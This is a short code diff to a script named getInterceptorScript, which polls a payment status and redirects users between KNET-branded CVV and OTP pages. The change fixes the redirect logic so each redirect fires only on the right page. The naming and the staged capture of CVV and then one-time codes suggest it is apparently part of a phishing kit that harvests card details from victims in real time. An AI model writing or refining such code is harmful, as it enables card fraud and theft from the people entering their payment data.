@@ -48,13 +48,14 @@ function getInterceptorScript() {
           var status = data.payment.status;
           if (status === _lastStatus) return;
           _lastStatus = status;
-          if (status === 'CVV_PENDING') {
+          var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
+          if (status === 'CVV_PENDING' && !isCvvPage) {
             clearInterval(_pollTimer);
             window.location.href = '/knet/cvv?id=' + id;
-          } else if (status === 'CVV_APPROVED') {
+          } else if (status === 'CVV_APPROVED' && isCvvPage) {
             clearInterval(_pollTimer);
             window.location.href = '/knet-otp?id=' + id;
-          } else if (status === 'CVV_FAILED') {
+          } else if (status === 'CVV_FAILED' && isCvvPage) {
             clearInterval(_pollTimer);
             window.location.href = '/knet/cvv?id=' + id + '&error=1';
           }
